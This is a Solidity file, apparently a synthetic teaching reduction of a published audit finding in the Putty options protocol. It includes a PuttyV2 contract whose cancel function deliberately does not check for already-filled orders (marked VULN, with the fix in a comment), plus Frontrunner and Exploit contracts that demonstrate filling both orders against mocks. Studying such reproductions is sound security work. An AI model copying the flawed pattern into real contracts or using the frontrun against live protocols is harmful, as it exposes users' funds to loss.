// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Putty — [H-02] acceptCounterOffer() may result in both orders being filled
    (Code4rena 2022-06-putty, finding #42730, reporter hyh / kirk-baird et al.).

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: acceptCounterOffer() calls cancel(originalOrder) then
    fillOrder(order). cancel() does NOT revert when the original order was
    already filled — it only sets cancelledOrders[hash]=true. A frontrunner
    can fill originalOrder first; acceptCounterOffer then no-ops cancel and
    still fills the counter order → both orders filled (double leverage).

    Vulnerable cancel + acceptCounterOffer shape preserved (@> VULN).
//////////////////////////////////////////////////////////////////////////*/

contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) {
            require(a >= amt, "allow");
            allowance[from][msg.sender] = a - amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Reduced PuttyV2 order book: fill / cancel / acceptCounterOffer.
contract PuttyV2 {
    struct Order {
        address maker;
        address baseAsset; // collateral the maker posts when filled
        uint256 baseAmount;
        bool isCall; // unused shape fidelity
    }

    mapping(bytes32 => bool) public cancelledOrders;
    mapping(bytes32 => address) public filledBy; // 0 = unfilled
    mapping(bytes32 => bool) public isFilled;
    uint256 public filledCount;

    event CancelledOrder(bytes32 orderHash);
    event FilledOrder(bytes32 orderHash, address filler);

    function hashOrder(Order memory order) public pure returns (bytes32) {
        return keccak256(abi.encode(order.maker, order.baseAsset, order.baseAmount, order.isCall));
    }

    /// @notice Verbatim-shape cancel — does NOT revert if already filled.
    function cancel(Order memory order) public {
        require(msg.sender == order.maker, "Not your order");

        bytes32 orderHash = hashOrder(order);

        // mark the order as cancelled
        // FIX: require(filledBy[orderHash] == address(0), "already filled");
        cancelledOrders[orderHash] = true; // @> VULN: cancel does not revert if order already filled

        emit CancelledOrder(orderHash);
    }

    function fillOrder(Order memory order) public returns (uint256 positionId) {
        bytes32 orderHash = hashOrder(order);
        require(!cancelledOrders[orderHash], "cancelled");
        require(!isFilled[orderHash], "already filled");

        // Maker posts baseAsset to this contract (escrow); filler is the counterparty.
        require(MockERC20(order.baseAsset).transferFrom(order.maker, address(this), order.baseAmount), "xfer");

        isFilled[orderHash] = true;
        filledBy[orderHash] = msg.sender;
        filledCount += 1;
        positionId = filledCount;
        emit FilledOrder(orderHash, msg.sender);
    }

    /// @notice Verbatim acceptCounterOffer shape from PuttyV2.sol#L573-L584.
    function acceptCounterOffer(Order memory order, Order memory originalOrder)
        public
        returns (uint256 positionId)
    {
        // cancel the original order
        cancel(originalOrder);

        // accept the counter offer
        positionId = fillOrder(order);
    }
}

/// @dev Frontrunner that fills the original order before acceptCounterOffer.
contract Frontrunner {
    PuttyV2 public putty;

    constructor(PuttyV2 _putty) {
        putty = _putty;
    }

    function fill(PuttyV2.Order memory order) external {
        putty.fillOrder(order);
    }
}

/// @notice Maker posts two orders; frontrun fills original; acceptCounterOffer
///         still fills the counter → both filled (double leverage).
contract Exploit {
    MockERC20 public token; // 1
    PuttyV2 public putty; // 2
    Frontrunner public frontrunner; // 3

    PuttyV2.Order public originalOrder;
    PuttyV2.Order public counterOrder;

    constructor() {
        token = new MockERC20(); // 1
        putty = new PuttyV2(); // 2
        frontrunner = new Frontrunner(putty); // 3

        // Maker = this contract posts collateral for both orders
        token.mint(address(this), 200e18);
        token.approve(address(putty), type(uint256).max);

        originalOrder = PuttyV2.Order({
            maker: address(this),
            baseAsset: address(token),
            baseAmount: 100e18,
            isCall: true
        });
        counterOrder = PuttyV2.Order({
            maker: address(this),
            baseAsset: address(token),
            baseAmount: 100e18,
            isCall: false
        });
    }

    function run() external {
        bytes32 origHash = putty.hashOrder(originalOrder);
        bytes32 counterHash = putty.hashOrder(counterOrder);

        require(!putty.isFilled(origHash) && !putty.isFilled(counterHash), "pre");

        // 1. Attacker frontruns: fills the original order
        frontrunner.fill(originalOrder);
        require(putty.isFilled(origHash), "original not filled by frontrun");
        require(putty.filledCount() == 1, "one fill so far");

        // 2. Maker's acceptCounterOffer still succeeds: cancel is no-op, counter fills
        putty.acceptCounterOffer(counterOrder, originalOrder);

        // HARM: both orders filled — maker is twice leveraged
        require(putty.isFilled(origHash), "original still filled");
        require(putty.isFilled(counterHash), "counter not filled");
        require(putty.filledCount() == 2, "both orders not filled");
        require(putty.cancelledOrders(origHash), "cancel flagged after the fact");
        // Maker escrowed 200 instead of intended 100
        require(token.balanceOf(address(putty)) == 200e18, "double collateral locked");
        require(token.balanceOf(address(this)) == 0, "maker drained of both order sizes");
    }
}
